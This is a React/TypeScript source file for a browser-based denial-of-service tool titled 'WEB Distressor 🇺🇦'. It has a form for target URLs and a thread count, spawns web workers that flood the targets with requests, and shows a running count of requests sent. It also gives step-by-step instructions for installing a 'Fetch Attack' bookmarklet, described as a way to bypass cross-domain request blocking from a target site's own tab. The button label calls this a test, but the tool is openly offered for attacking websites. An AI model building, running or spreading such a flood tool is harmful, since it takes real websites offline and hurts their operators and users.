import {
  Box,
  Button,
  Container,
  createTheme,
  CssBaseline,
  Alert,
  TextField,
  ThemeProvider,
  Typography,
  Divider,
  Card,
  CardContent,
} from "@mui/material";
import * as React from "react";
import {
  animationFrameScheduler,
  fromEvent,
  merge,
  observeOn,
  scan,
  tap,
} from "rxjs";
import { fetchAttack } from "./fetch";

const theme = createTheme();

export const Main = () => {
  const [n, setN] = React.useState(0n);
  const [active, setActive] = React.useState(false);
  const run: React.FormEventHandler<HTMLFormElement> = (e) => {
    e.preventDefault();
    setActive(true);
    const data = new FormData(e.currentTarget);
    const url = data.get("target");
    const threads = +(data.get("threads") ?? 0);
    const msg = {
      type: "init",
      url,
      threads,
    };
    merge(
      ...[...Array(threads).keys()].map(() => {
        const w = new Worker(new URL("./worker.ts", import.meta.url), {
          type: "module",
        });
        w.postMessage(msg);
        return fromEvent<MessageEvent>(w, "message");
      })
    )
      .pipe(
        observeOn(animationFrameScheduler),
        scan((a, c) => a + c.data, 0n),
        tap(setN)
      )
      .subscribe();
  };

  return (
    <ThemeProvider theme={theme}>
      <Container component="main" maxWidth="xs">
        <CssBaseline />
        <Box
          sx={{
            marginTop: 8,
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
          }}
        >
          <Typography component="h1" variant="h5">
            WEB Distressor 🇺🇦
          </Typography>
          <Box component="form" onSubmit={run} sx={{ mt: 1 }}>
            <TextField
              margin="normal"
              required
              fullWidth
              id="target"
              label="Target URLs (separated with ',')"
              name="target"
              autoFocus
              disabled={active}
            />
            <TextField
              margin="normal"
              required
              fullWidth
              name="threads"
              label="Number of threads"
              type="number"
              id="threads"
              defaultValue={5}
              disabled={active}
            />
            <Button
              disabled={active}
              type="submit"
              fullWidth
              variant="contained"
            >
              Start test
            </Button>
          </Box>
          <Divider />
          <Box component="div" mt={2}>
            <Alert severity="success">{`Requests sent: ${n}`}</Alert>
          </Box>
        </Box>
        <Box mt={2}>
          <Card variant="outlined">
            <CardContent>
              <Typography
                sx={{ fontSize: 16 }}
                color="text.secondary"
                gutterBottom
              >
                Fetch Attack
              </Typography>
              <Typography variant="body2" component="div">
                Use this method to bypass cross-domain request blocking:
              </Typography>
              <Typography variant="body2" component="div">
                1. Drag this link to the Bookmarks tab of your browser
              </Typography>
              <Typography variant="body2" component="div">
                ---{">"}{" "}
                <a
                  href="#"
                  onMouseOver={(
                    e: React.MouseEvent<HTMLAnchorElement, MouseEvent>
                  ) => (e.currentTarget.href = `javascript:${fetchAttack}`)}
                >
                  FETCH ATTACK
                </a>{" "}
                {"<"}---
              </Typography>
              <Typography variant="body2" component="div">
                2. Open a target site in a new tab
              </Typography>
              <Typography variant="body2" component="div">
                3. Click the link and adjust the number of threads
              </Typography>
            </CardContent>
          </Card>
        </Box>
      </Container>
    </ThemeProvider>
  );
};
